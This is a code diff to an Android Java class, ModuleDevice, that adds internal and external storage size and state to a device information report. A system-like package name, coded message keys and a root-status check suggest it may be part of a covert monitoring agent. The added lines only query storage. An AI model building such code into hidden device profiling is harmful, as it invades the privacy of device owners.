@@ -20,6 +20,8 @@ import java.util.Properties;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
 import android.os.Build;
+import android.os.Environment;
+import android.os.StatFs;
 
 import com.android.networking.Device;
 import com.android.networking.Messages;
@@ -120,6 +122,16 @@ public class ModuleDevice extends BaseInstantModule {
 		sb.append(Messages.getString("9_9") + cpuUsage + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 		sb.append(Messages.getString("9_11") + cpuTotal + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 		sb.append(Messages.getString("9_13") + cpuIdle + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+
+		StatFs stat = new StatFs(Environment.getDataDirectory().getPath());
+		long bytesAvailableInt = (long) stat.getBlockSize() * (long) stat.getBlockCount();
+		sb.append("internal space: " + bytesAvailableInt + "\n");
+
+		stat = new StatFs(Environment.getExternalStorageDirectory().getPath());
+		long bytesAvailableExt = (long) stat.getBlockSize() * (long) stat.getBlockCount();
+
+		sb.append("external state: " + Environment.getExternalStorageState() + "\n");
+		sb.append("external space: " + bytesAvailableExt + "\n");
 
 		if (Cfg.DEBUG) {
 			if (Status.self().haveRoot()) {
